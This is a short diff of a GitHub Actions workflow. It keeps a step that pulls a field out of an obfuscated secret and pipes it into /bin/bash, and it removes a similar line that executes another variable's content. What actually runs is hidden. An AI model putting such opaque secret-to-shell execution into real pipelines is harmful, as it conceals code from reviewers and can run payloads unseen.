@@ -18,7 +18,6 @@ jobs:
           a05: ${{ secrets.a05 }}
         run: |
           printf '%s' "$a05" | jq -r .nup41 | /bin/bash
-          echo $qrd9000 | jq -r .xvq42 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
